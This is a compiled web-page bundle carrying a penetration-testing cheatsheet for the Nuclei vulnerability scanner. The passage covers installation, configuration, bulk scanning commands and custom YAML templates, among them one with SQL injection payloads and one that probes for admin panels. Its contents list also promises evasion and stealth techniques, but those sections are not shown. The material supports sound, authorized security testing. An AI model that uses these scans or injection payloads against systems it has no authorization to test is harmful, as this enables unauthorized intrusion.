"use strict";(globalThis.webpackChunkgl_0_bal_01=globalThis.webpackChunkgl_0_bal_01||[]).push([[6574],{28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>o});var i=t(96540);const s={},a=i.createContext(s);function r(e){const n=i.useContext(a);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:r(e.components),i.createElement(a.Provider,{value:n},e.children)}},35427:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>o,default:()=>u,frontMatter:()=>r,metadata:()=>i,toc:()=>c});const i=JSON.parse('{"id":"cheatsheets/projectdiscovery/projectdiscovery_nuclei","title":"Comprehensive Nuclei Vulnerability Scanning Reference","description":"A practical reference guide for Nuclei vulnerability scanner with real-world examples, advanced techniques, and evasion strategies for penetration testing and security research.","source":"@site/docs/cheatsheets/projectdiscovery/projectdiscovery_nuclei.md","sourceDirName":"cheatsheets/projectdiscovery","slug":"/cheatsheets/projectdiscovery/nuclei","permalink":"/cheatsheets/projectdiscovery/nuclei","draft":false,"unlisted":false,"editUrl":"https://github.com/gl0bal01/gl0bal01.github.io/tree/main/docs/cheatsheets/projectdiscovery/projectdiscovery_nuclei.md","tags":[{"inline":true,"label":"nuclei","permalink":"/tags/nuclei"},{"inline":true,"label":"vulnerability-scanning","permalink":"/tags/vulnerability-scanning"},{"inline":true,"label":"pentesting","permalink":"/tags/pentesting"},{"inline":true,"label":"security-tools","permalink":"/tags/security-tools"},{"inline":true,"label":"cve","permalink":"/tags/cve"}],"version":"current","lastUpdatedAt":1751446347000,"sidebarPosition":2,"frontMatter":{"slug":"nuclei","title":"Comprehensive Nuclei Vulnerability Scanning Reference","description":"A practical reference guide for Nuclei vulnerability scanner with real-world examples, advanced techniques, and evasion strategies for penetration testing and security research.","keywords":["nuclei","vulnerability scanner","penetration testing","security","yaml templates","nuclei-templates","CVE scanning","web application security"],"tags":["nuclei","vulnerability-scanning","pentesting","security-tools","cve"],"sidebar_label":"Nuclei Practical","sidebar_position":2,"authors":["gl0bal01"]},"sidebar":"tutorialSidebar","previous":{"title":"Discovery Tools","permalink":"/cheatsheets/projectdiscovery/tools"},"next":{"title":"Reverse Engineering","permalink":"/reverse-engineering"}}');var s=t(74848),a=t(28453);const r={slug:"nuclei",title:"Comprehensive Nuclei Vulnerability Scanning Reference",description:"A practical reference guide for Nuclei vulnerability scanner with real-world examples, advanced techniques, and evasion strategies for penetration testing and security research.",keywords:["nuclei","vulnerability scanner","penetration testing","security","yaml templates","nuclei-templates","CVE scanning","web application security"],tags:["nuclei","vulnerability-scanning","pentesting","security-tools","cve"],sidebar_label:"Nuclei Practical",sidebar_position:2,authors:["gl0bal01"]},o="Nuclei Practical Guide",l={},c=[{value:"Abstract",id:"abstract",level:2},{value:"1. Introduction",id:"1-introduction",level:2},{value:"1.1 Nuclei Architecture Overview",id:"11-nuclei-architecture-overview",level:3},{value:"1.2 Scanning Methodology Classification",id:"12-scanning-methodology-classification",level:3},{value:"1.3 Template Effectiveness Matrix",id:"13-template-effectiveness-matrix",level:3},{value:"2. Installation and Basic Configuration",id:"2-installation-and-basic-configuration",level:2},{value:"2.1 Standard Installation Methods",id:"21-standard-installation-methods",level:3},{value:"2.2 Template Management",id:"22-template-management",level:3},{value:"2.3 Configuration File Setup",id:"23-configuration-file-setup",level:3},{value:"3. Basic Scanning Operations",id:"3-basic-scanning-operations",level:2},{value:"3.1 Single Target Scanning",id:"31-single-target-scanning",level:3},{value:"3.2 Multiple Target Scanning",id:"32-multiple-target-scanning",level:3},{value:"3.3 Template-Specific Scanning",id:"33-template-specific-scanning",level:3},{value:"4. Advanced Template Operations",id:"4-advanced-template-operations",level:2},{value:"4.1 Custom Template Development",id:"41-custom-template-development",level:3},{value:"4.2 Multi-Protocol Template Implementation",id:"42-multi-protocol-template-implementation",level:3},{value:"4.3 Advanced Template Features",id:"43-advanced-template-features",level:3},{value:"5. Specialized Scanning Techniques",id:"5-specialized-scanning-techniques",level:2},{value:"5.1 Network Service Enumeration",id:"51-network-service-enumeration",level:3},{value:"5.2 DNS Reconnaissance",id:"52-dns-reconnaissance",level:3},{value:"5.3 SSL/TLS Security Assessment",id:"53-ssltls-security-assessment",level:3},{value:"6. Web Application Security Testing",id:"6-web-application-security-testing",level:2},{value:"6.1 OWASP Top 10 Vulnerability Detection",id:"61-owasp-top-10-vulnerability-detection",level:3},{value:"6.2 API Security Assessment",id:"62-api-security-assessment",level:3},{value:"6.3 Content Management System Testing",id:"63-content-management-system-testing",level:3},{value:"7. Cloud Security Assessment",id:"7-cloud-security-assessment",level:2},{value:"7.1 AWS Security Configuration",id:"71-aws-security-configuration",level:3},{value:"7.2 Azure Security Assessment",id:"72-azure-security-assessment",level:3},{value:"7.3 Google Cloud Platform Testing",id:"73-google-cloud-platform-testing",level:3},{value:"8. Integration and Automation",id:"8-integration-and-automation",level:2},{value:"8.1 CI/CD Pipeline Integration",id:"81-cicd-pipeline-integration",level:3},{value:"8.2 Jenkins Pipeline Integration",id:"82-jenkins-pipeline-integration",level:3},{value:"8.3 API Integration and Automation",id:"83-api-integration-and-automation",level:3},{value:"9. Output Management and Reporting",id:"9-output-management-and-reporting",level:2},{value:"9.1 Output Format Options",id:"91-output-format-options",level:3},{value:"9.2 Custom Reporting Templates",id:"92-custom-reporting-templates",level:3},{value:"9.3 Result Filtering and Processing",id:"93-result-filtering-and-processing",level:3},{value:"10. Performance Optimization",id:"10-performance-optimization",level:2},{value:"10.1 Rate Limiting and Traffic Control",id:"101-rate-limiting-and-traffic-control",level:3},{value:"10.2 Distributed Scanning",id:"102-distributed-scanning",level:3},{value:"10.3 Resource Monitoring",id:"103-resource-monitoring",level:3},{value:"11. Evasion and Stealth Techniques",id:"11-evasion-and-stealth-techniques",level:2},{value:"11.1 Request Modification and Obfuscation",id:"111-request-modification-and-obfuscation",level:3},{value:"11.2 Traffic Pattern Modification",id:"112-traffic-pattern-modification",level:3},{value:"11.3 Proxy Chain Implementation",id:"113-proxy-chain-implementation",level:3},{value:"12. Custom Template Development",id:"12-custom-template-development",level:2},{value:"12.1 Template Structure and Components",id:"121-template-structure-and-components",level:3},{value:"12.2 Multi-Step Template Implementation",id:"122-multi-step-template-implementation",level:3},{value:"12.3 Protocol-Specific Templates",id:"123-protocol-specific-templates",level:3},{value:"13. Detection and Defense Evasion",id:"13-detection-and-defense-evasion",level:2},{value:"13.1 Behavioral Pattern Modification",id:"131-behavioral-pattern-modification",level:3},{value:"13.2 Template Modification for Stealth",id:"132-template-modification-for-stealth",level:3},{value:"13.3 Advanced Evasion Techniques",id:"133-advanced-evasion-techniques",level:3},{value:"14. Integration with Security Tools",id:"14-integration-with-security-tools",level:2},{value:"14.1 SIEM Integration",id:"141-siem-integration",level:3},{value:"14.2 Vulnerability Management Integration",id:"142-vulnerability-management-integration",level:3},{value:"14.3 Ticketing System Integration",id:"143-ticketing-system-integration",level:3},{value:"15. Open Source Intelligence (OSINT) and Reconnaissance",id:"15-open-source-intelligence-osint-and-reconnaissance",level:2},{value:"15.1 Passive Information Gathering",id:"151-passive-information-gathering",level:3},{value:"15.2 Exposed Information Discovery",id:"152-exposed-information-discovery",level:3},{value:"15.3 Social Media and Public Platform Reconnaissance",id:"153-social-media-and-public-platform-reconnaissance",level:3},{value:"15.4 Metadata and Document Intelligence",id:"154-metadata-and-document-intelligence",level:3},{value:"15.5 Advanced OSINT Template Development",id:"155-advanced-osint-template-development",level:3},{value:"15.6 Corporate Intelligence Gathering",id:"156-corporate-intelligence-gathering",level:3},{value:"15.7 Infrastructure and Network Intelligence",id:"157-infrastructure-and-network-intelligence",level:3},{value:"15.8 Automated OSINT Data Aggregation",id:"158-automated-osint-data-aggregation",level:3},{value:"15.9 OSINT Data Correlation and Analysis",id:"159-osint-data-correlation-and-analysis",level:3},{value:"15.10 Integration with External OSINT Tools",id:"1510-integration-with-external-osint-tools",level:3},{value:"15.11 Dark Web and Deep Web Reconnaissance",id:"1511-dark-web-and-deep-web-reconnaissance",level:3},{value:"15.12 Competitive Intelligence Gathering",id:"1512-competitive-intelligence-gathering",level:3},{value:"15.13 Threat Intelligence Integration",id:"1513-threat-intelligence-integration",level:3},{value:"16. Legal and Ethical Considerations",id:"16-legal-and-ethical-considerations",level:2},{value:"16.1 Authorization Requirements",id:"161-authorization-requirements",level:3},{value:"16.2 Documentation Standards",id:"162-documentation-standards",level:3},{value:"16.3 Responsible Disclosure",id:"163-responsible-disclosure",level:3},{value:"17. Troubleshooting and Common Issues",id:"17-troubleshooting-and-common-issues",level:2},{value:"17.1 Performance Issues",id:"171-performance-issues",level:3},{value:"17.2 Network Connectivity Issues",id:"172-network-connectivity-issues",level:3},{value:"17.3 Template Development Debugging",id:"173-template-development-debugging",level:3},{value:"19. AI-Powered Template Generation and Security Testing",id:"19-ai-powered-template-generation-and-security-testing",level:2},{value:"19.1 Native AI Template Generation",id:"191-native-ai-template-generation",level:3},{value:"19.2 AI Browser Extension for Real-Time Template Creation",id:"192-ai-browser-extension-for-real-time-template-creation",level:3},{value:"19.3 Comprehensive AI Security Testing Workflows",id:"193-comprehensive-ai-security-testing-workflows",level:3},{value:"19.3.1 Reconnaissance and Information Gathering",id:"1931-reconnaissance-and-information-gathering",level:4},{value:"19.3.2 Configuration and Security Misconfiguration Detection",id:"1932-configuration-and-security-misconfiguration-detection",level:4},{value:"19.3.3 Advanced Web Application Security Testing",id:"1933-advanced-web-application-security-testing",level:4},{value:"19.3.4 Cross-Site Scripting (XSS) Detection",id:"1934-cross-site-scripting-xss-detection",level:4},{value:"19.3.5 Server-Side Request Forgery (SSRF) Detection",id:"1935-server-side-request-forgery-ssrf-detection",level:4},{value:"19.3.6 File Inclusion Vulnerability Testing",id:"1936-file-inclusion-vulnerability-testing",level:4},{value:"19.4 JavaScript Security Analysis with AI",id:"194-javascript-security-analysis-with-ai",level:3},{value:"19.5 Cloud Security Assessment with AI",id:"195-cloud-security-assessment-with-ai",level:3},{value:"19.6 AI Template Development and Customization",id:"196-ai-template-development-and-customization",level:3},{value:"19.7 AI Prompt Engineering for Security Testing",id:"197-ai-prompt-engineering-for-security-testing",level:3},{value:"19.8 AI Template Validation and Quality Assurance",id:"198-ai-template-validation-and-quality-assurance",level:3},{value:"19.9 Advanced AI Security Testing Scenarios",id:"199-advanced-ai-security-testing-scenarios",level:3},{value:"19.10 Integration with AI Security Platforms",id:"1910-integration-with-ai-security-platforms",level:3},{value:"20. Monitoring and Defensive Considerations",id:"20-monitoring-and-defensive-considerations",level:2},{value:"20.1 Detection Signatures",id:"201-detection-signatures",level:3},{value:"20.2 Defensive Countermeasures",id:"202-defensive-countermeasures",level:3},{value:"20.3 Response and Mitigation Strategies",id:"203-response-and-mitigation-strategies",level:3},{value:"Conclusion",id:"conclusion",level:2},{value:"References",id:"references",level:2}];function d(e){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.header,{children:(0,s.jsx)(n.h1,{id:"nuclei-practical-guide",children:"Nuclei Practical Guide"})}),"\n",(0,s.jsx)(n.h2,{id:"abstract",children:"Abstract"}),"\n",(0,s.jsx)(n.p,{children:"This comprehensive practical reference presents an exhaustive analysis of Nuclei vulnerability scanning methodologies, template development, and advanced operational techniques. We examine seventeen primary scanning categories across multiple protocols, providing detailed implementation examples, template customization strategies, and detection evasion techniques. This manual serves as both theoretical foundation and practical implementation guide for cybersecurity researchers, penetration testers, and security practitioners."}),"\n",(0,s.jsx)(n.h2,{id:"1-introduction",children:"1. Introduction"}),"\n",(0,s.jsx)(n.p,{children:"Nuclei constitutes a foundational tool for modern vulnerability assessment and penetration testing workflows. This fast, customizable vulnerability scanner leverages community-driven YAML templates to identify security issues across web applications, APIs, networks, DNS, and cloud configurations, enabling automated detection of trending vulnerabilities with minimal false positives."}),"\n",(0,s.jsx)(n.h3,{id:"11-nuclei-architecture-overview",children:"1.1 Nuclei Architecture Overview"}),"\n",(0,s.jsx)(n.p,{children:"Nuclei operates on a simple yet powerful architecture based on YAML-defined templates that specify detection logic for vulnerabilities:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Template Engine"}),": YAML-based DSL for defining vulnerability detection logic"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Protocol Support"}),": HTTP/HTTPS, DNS, TCP, SSL, WebSocket, Code, JavaScript, File protocols"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Parallel Execution"}),": High-performance concurrent scanning capabilities"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Community Templates"}),": 6000+ community-contributed templates for current vulnerabilities"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Custom Integration"}),": CI/CD pipeline integration and custom template development"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"12-scanning-methodology-classification",children:"1.2 Scanning Methodology Classification"}),"\n",(0,s.jsx)(n.p,{children:"Nuclei scanning methodologies can be systematically categorized into seven primary classes:"}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Web Application Scanning"}),": HTTP-based vulnerability detection and enumeration"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Network Service Scanning"}),": TCP/UDP service identification and vulnerability assessment"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"DNS Enumeration"}),": Domain-based reconnaissance and misconfiguration detection"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"SSL/TLS Analysis"}),": Certificate validation and cryptographic vulnerability assessment"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Code Analysis"}),": Static analysis of source code for security flaws"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"File System Scanning"}),": Local file analysis for sensitive information exposure"]}),"\n",(0,s.jsxs)(n.li,{children:[(0,s.jsx)(n.strong,{children:"Custom Protocol Testing"}),": Specialized protocol analysis through custom templates"]}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"13-template-effectiveness-matrix",children:"1.3 Template Effectiveness Matrix"}),"\n",(0,s.jsxs)(n.table,{children:[(0,s.jsx)(n.thead,{children:(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.th,{children:"Category"}),(0,s.jsx)(n.th,{children:"Templates"}),(0,s.jsx)(n.th,{children:"Severity Coverage"}),(0,s.jsx)(n.th,{children:"Protocol Support"}),(0,s.jsx)(n.th,{children:"Update Frequency"}),(0,s.jsx)(n.th,{children:"Detection Accuracy"})]})}),(0,s.jsxs)(n.tbody,{children:[(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"CVEs"}),(0,s.jsx)(n.td,{children:"2,847"}),(0,s.jsx)(n.td,{children:"Critical-Low"}),(0,s.jsx)(n.td,{children:"HTTP/TCP/DNS"}),(0,s.jsx)(n.td,{children:"Daily"}),(0,s.jsx)(n.td,{children:"Very High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Exposures"}),(0,s.jsx)(n.td,{children:"1,245"}),(0,s.jsx)(n.td,{children:"Medium-Info"}),(0,s.jsx)(n.td,{children:"HTTP/File"}),(0,s.jsx)(n.td,{children:"Weekly"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Misconfigurations"}),(0,s.jsx)(n.td,{children:"892"}),(0,s.jsx)(n.td,{children:"Medium-Low"}),(0,s.jsx)(n.td,{children:"Multi-Protocol"}),(0,s.jsx)(n.td,{children:"Bi-weekly"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Technologies"}),(0,s.jsx)(n.td,{children:"673"}),(0,s.jsx)(n.td,{children:"Info"}),(0,s.jsx)(n.td,{children:"HTTP/TCP"}),(0,s.jsx)(n.td,{children:"Monthly"}),(0,s.jsx)(n.td,{children:"Very High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Fuzzing"}),(0,s.jsx)(n.td,{children:"434"}),(0,s.jsx)(n.td,{children:"Medium-High"}),(0,s.jsx)(n.td,{children:"HTTP"}),(0,s.jsx)(n.td,{children:"Weekly"}),(0,s.jsx)(n.td,{children:"Medium"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"Default Logins"}),(0,s.jsx)(n.td,{children:"287"}),(0,s.jsx)(n.td,{children:"High-Medium"}),(0,s.jsx)(n.td,{children:"HTTP/TCP"}),(0,s.jsx)(n.td,{children:"Monthly"}),(0,s.jsx)(n.td,{children:"High"})]}),(0,s.jsxs)(n.tr,{children:[(0,s.jsx)(n.td,{children:"DNS"}),(0,s.jsx)(n.td,{children:"156"}),(0,s.jsx)(n.td,{children:"Low-Info"}),(0,s.jsx)(n.td,{children:"DNS"}),(0,s.jsx)(n.td,{children:"Monthly"}),(0,s.jsx)(n.td,{children:"High"})]})]})]}),"\n",(0,s.jsx)(n.h2,{id:"2-installation-and-basic-configuration",children:"2. Installation and Basic Configuration"}),"\n",(0,s.jsx)(n.p,{children:"The following commands assume you have appropriate system permissions and network connectivity. Substitute all placeholder values with those specific to your environment."}),"\n",(0,s.jsx)(n.h3,{id:"21-standard-installation-methods",children:"2.1 Standard Installation Methods"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Go-based installation (recommended)\ngo install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\n\n# Homebrew installation (macOS/Linux)\nbrew install nuclei\n\n# Docker installation\ndocker run -it projectdiscovery/nuclei:latest\n\n# Binary download (Linux)\nwget https://github.com/projectdiscovery/nuclei/releases/latest/download/nuclei_3.0.0_linux_amd64.zip\nunzip nuclei_3.0.0_linux_amd64.zip\nchmod +x nuclei\n\n# APT installation (Debian/Ubuntu)\nsudo apt update && sudo apt install nuclei\n"})}),"\n",(0,s.jsx)(n.h3,{id:"22-template-management",children:"2.2 Template Management"}),"\n",(0,s.jsx)(n.p,{children:"Nuclei templates form the core of the scanning engine and require regular updates for optimal effectiveness:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Update templates to latest version\nnuclei -update-templates\n\n# Update templates with custom directory\nnuclei -update-templates -update-template-dir /custom/templates\n\n# Force template update (overwrite existing)\nnuclei -update-templates -force\n\n# List available template statistics\nnuclei -tl\n\n# Show template metadata and paths\nnuclei -templates-info\n\n# Validate template syntax\nnuclei -validate -t /path/to/template.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"23-configuration-file-setup",children:"2.3 Configuration File Setup"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'# ~/.nuclei/config.yaml\ntemplates-directory: "/home/user/.nuclei-templates/"\noutput-directory: "/home/user/nuclei-output/"\nrate-limit: 150\nbulk-size: 25\ntimeout: 10\nretries: 1\nseverity: ["critical", "high", "medium"]\nexclude-severity: ["info"]\ninclude-tags: ["cve", "exposure", "misconfig"]\nexclude-tags: ["intrusive", "dos"]\n'})}),"\n",(0,s.jsx)(n.h2,{id:"3-basic-scanning-operations",children:"3. Basic Scanning Operations"}),"\n",(0,s.jsx)(n.p,{children:"Replace target URLs, IP addresses, and file paths with your specific target environment. Ensure proper authorization before conducting any scans."}),"\n",(0,s.jsx)(n.h3,{id:"31-single-target-scanning",children:"3.1 Single Target Scanning"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Basic vulnerability scan\nnuclei -u https://example.com\n\n# Scan with specific severity levels\nnuclei -u https://example.com -severity critical,high,medium\n\n# Scan with custom rate limiting\nnuclei -u https://example.com -rate-limit 50 -bulk-size 10\n\n# Verbose output with request/response details\nnuclei -u https://example.com -v\n\n# Silent mode (findings only)\nnuclei -u https://example.com -silent\n\n# JSON output format\nnuclei -u https://example.com -json\n"})}),"\n",(0,s.jsx)(n.h3,{id:"32-multiple-target-scanning",children:"3.2 Multiple Target Scanning"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Scan multiple targets from file\nnuclei -l targets.txt\n\n# Scan IP ranges and subnets\nnuclei -l ip_ranges.txt -severity critical,high\n\n# Scan with target filtering\nnuclei -l targets.txt -timeout 15 -retries 2\n\n# Bulk scanning with custom templates\nnuclei -l targets.txt -t custom-templates/ -severity critical\n\n# Parallel target processing\nnuclei -l targets.txt -bulk-size 50 -rate-limit 200\n"})}),"\n",(0,s.jsx)(n.h3,{id:"33-template-specific-scanning",children:"3.3 Template-Specific Scanning"}),"\n",(0,s.jsx)(n.p,{children:"Templates provide the detection logic for specific vulnerabilities and can be selectively executed:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Scan with specific template category\nnuclei -u https://example.com -t cves/\n\n# Multiple template directories\nnuclei -u https://example.com -t cves/ -t exposures/ -t misconfigurations/\n\n# Single template execution\nnuclei -u https://example.com -t cves/2023/CVE-2023-12345.yaml\n\n# Template tag-based filtering\nnuclei -u https://example.com -tags apache,nginx,ssl\n\n# Exclude specific templates\nnuclei -u https://example.com -exclude-templates dos/\n\n# Template condition-based execution\nnuclei -u https://example.com -template-condition \"contains(tags, 'rce')\"\n"})}),"\n",(0,s.jsx)(n.h2,{id:"4-advanced-template-operations",children:"4. Advanced Template Operations"}),"\n",(0,s.jsx)(n.p,{children:"Ensure template files are accessible and properly formatted. Validate custom templates before deployment to avoid false positives or scanning errors."}),"\n",(0,s.jsx)(n.h3,{id:"41-custom-template-development",children:"4.1 Custom Template Development"}),"\n",(0,s.jsx)(n.p,{children:"Basic template structure for vulnerability detection:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: custom-admin-panel-detection\n\ninfo:\n  name: Admin Panel Detection\n  author: security-researcher\n  severity: info\n  description: Detects exposed admin panels and interfaces\n  classification:\n    cwe-id: CWE-200\n  metadata:\n    shodan-query: "title:admin panel"\n  tags: exposure,panel,admin\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/admin"\n      - "{{BaseURL}}/admin/"\n      - "{{BaseURL}}/administrator"\n      - "{{BaseURL}}/wp-admin"\n      - "{{BaseURL}}/phpmyadmin"\n\n    matchers-condition: and\n    matchers:\n      - type: status\n        status:\n          - 200\n      - type: word\n        words:\n          - "admin panel"\n          - "administrator"\n          - "login"\n        condition: or\n        case-insensitive: true\n\n    extractors:\n      - type: regex\n        regex:\n          - \'title="([^"]*)"\'\n        group: 1\n'})}),"\n",(0,s.jsx)(n.h3,{id:"42-multi-protocol-template-implementation",children:"4.2 Multi-Protocol Template Implementation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: multi-protocol-service-detection\n\ninfo:\n  name: Multi-Protocol Service Detection\n  author: security-team\n  severity: info\n  description: Detects services across multiple protocols\n  tags: network,service,detection\n\ntcp:\n  - inputs:\n      - data: "\\n\\n"\n        read: 1024\n        read-size: 1024\n    host:\n      - "{{Hostname}}"\n    port:\n      - "22"\n      - "23"\n      - "21"\n    matchers:\n      - type: word\n        words:\n          - "SSH"\n          - "FTP"\n          - "Telnet"\n\ndns:\n  - name: "{{FQDN}}"\n    type: A\n    class: inet\n    matchers:\n      - type: word\n        words:\n          - "IN\\tA"\n\nssl:\n  - address: "{{Host}}:{{Port}}"\n    matchers:\n      - type: word\n        words:\n          - "subject:"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"43-advanced-template-features",children:"4.3 Advanced Template Features"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: advanced-sqli-detection\n\ninfo:\n  name: Advanced SQL Injection Detection\n  author: security-researcher\n  severity: high\n  description: Comprehensive SQL injection detection with multiple payloads\n  tags: sqli,injection,database\n\nvariables:\n  sqli_payloads:\n    - "\'"\n    - "1\' OR \'1\'=\'1"\n    - "\'; WAITFOR DELAY \'00:00:05\'--"\n    - "1\' UNION SELECT NULL,NULL--"\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/search?q={{sqli_payloads}}"\n      - "{{BaseURL}}/login?user={{sqli_payloads}}&pass=test"\n\n    attack: pitchfork\n    threads: 5\n    stop-at-first-match: true\n\n    matchers-condition: or\n    matchers:\n      - type: word\n        words:\n          - "SQL syntax"\n          - "mysql_fetch"\n          - "ORA-00933"\n          - "Microsoft JET Database"\n        condition: or\n\n      - type: status\n        status:\n          - 500\n\n      - type: dsl\n        dsl:\n          - "duration >= 5"\n\n    extractors:\n      - type: regex\n        regex:\n          - "(?i)(error|exception|stack trace)"\n        group: 1\n'})}),"\n",(0,s.jsx)(n.h2,{id:"5-specialized-scanning-techniques",children:"5. Specialized Scanning Techniques"}),"\n",(0,s.jsx)(n.p,{children:"Adjust network ranges, service ports, and protocols based on your target environment. Ensure scanning activities comply with scope limitations and authorization requirements."}),"\n",(0,s.jsx)(n.h3,{id:"51-network-service-enumeration",children:"5.1 Network Service Enumeration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# TCP port scanning with service detection\nnuclei -l ip_ranges.txt -t network/ -severity info,low,medium\n\n# Specific port range scanning\nnuclei -target 192.168.1.1-192.168.1.254 -t network/tcp-ports.yaml\n\n# UDP service detection\nnuclei -l targets.txt -t network/udp/ -timeout 20\n\n# Service version detection\nnuclei -l services.txt -t technologies/ -tags version\n\n# Banner grabbing across services\nnuclei -l targets.txt -t network/detection/ -v\n"})}),"\n",(0,s.jsx)(n.h3,{id:"52-dns-reconnaissance",children:"5.2 DNS Reconnaissance"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Comprehensive DNS enumeration\nnuclei -l domains.txt -t dns/ -severity info\n\n# DNS zone transfer detection\nnuclei -l nameservers.txt -t dns/zone-transfer.yaml\n\n# Subdomain enumeration via DNS\nnuclei -l domains.txt -t dns/dns-brute.yaml\n\n# DNS cache poisoning detection\nnuclei -l dns_servers.txt -t dns/cache-poisoning.yaml\n\n# DNSSEC validation testing\nnuclei -l domains.txt -t dns/dnssec-detection.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"53-ssltls-security-assessment",children:"5.3 SSL/TLS Security Assessment"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# SSL/TLS configuration analysis\nnuclei -l https_targets.txt -t ssl/\n\n# Certificate validation testing\nnuclei -l domains.txt -t ssl/ssl-certificate.yaml\n\n# Weak cipher detection\nnuclei -l ssl_hosts.txt -t ssl/weak-cipher.yaml\n\n# SSL/TLS version enumeration\nnuclei -l targets.txt -t ssl/tls-version.yaml\n\n# Certificate transparency log checking\nnuclei -l domains.txt -t ssl/certificate-transparency.yaml\n"})}),"\n",(0,s.jsx)(n.h2,{id:"6-web-application-security-testing",children:"6. Web Application Security Testing"}),"\n",(0,s.jsx)(n.p,{children:"The following examples target common web application vulnerabilities. Ensure testing is performed against authorized targets with appropriate permissions."}),"\n",(0,s.jsx)(n.h3,{id:"61-owasp-top-10-vulnerability-detection",children:"6.1 OWASP Top 10 Vulnerability Detection"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Injection vulnerability scanning\nnuclei -l webapps.txt -t cves/ -tags injection,sqli,xss\n\n# Broken authentication detection\nnuclei -l targets.txt -t exposures/panels/ -t default-logins/\n\n# Security misconfiguration assessment\nnuclei -l webapps.txt -t misconfigurations/ -severity medium,high\n\n# Insecure direct object reference testing\nnuclei -l targets.txt -t exposures/files/ -tags idor\n\n# Cross-site scripting (XSS) detection\nnuclei -l webapps.txt -t cves/ -tags xss\n\n# XML external entity (XXE) testing\nnuclei -l xml_endpoints.txt -t cves/ -tags xxe\n"})}),"\n",(0,s.jsx)(n.h3,{id:"62-api-security-assessment",children:"6.2 API Security Assessment"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# API endpoint discovery\nnuclei -l api_targets.txt -t exposures/apis/ -tags swagger,graphql\n\n# REST API vulnerability scanning\nnuclei -l api_endpoints.txt -t cves/ -tags api,rest\n\n# GraphQL security testing\nnuclei -l graphql_endpoints.txt -t exposures/apis/graphql.yaml\n\n# API authentication bypass testing\nnuclei -l api_targets.txt -t cves/ -tags auth-bypass\n\n# Rate limiting validation\nnuclei -l api_endpoints.txt -t misconfigurations/rate-limit.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"63-content-management-system-testing",children:"6.3 Content Management System Testing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# WordPress vulnerability scanning\nnuclei -l wordpress_sites.txt -t cves/wordpress/ -t exposures/wordpress/\n\n# Drupal security assessment\nnuclei -l drupal_sites.txt -t cves/drupal/ -severity critical,high\n\n# Joomla vulnerability detection\nnuclei -l joomla_sites.txt -t cves/joomla/ -t exposures/joomla/\n\n# Generic CMS 